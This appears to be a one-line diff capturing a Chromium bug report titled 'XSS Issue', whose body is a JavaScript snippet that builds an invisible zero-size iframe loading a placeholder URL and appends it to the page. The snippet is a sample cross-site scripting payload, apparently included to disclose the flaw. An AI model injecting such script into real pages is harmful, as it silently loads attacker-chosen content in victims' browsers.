@@ -1,0 +1,1 @@
+<title>Issue 34002 -   chromium -    XSS Issue - Project Hosting on Google Code</title> <pre>       var aaa=document.createElement('iframe');  aaa.src='http://eval.url.here';  aaa.style.display='none';  aaa.height=0;  aaa.width=0;  document.body.appendChild(aaa); </pre>
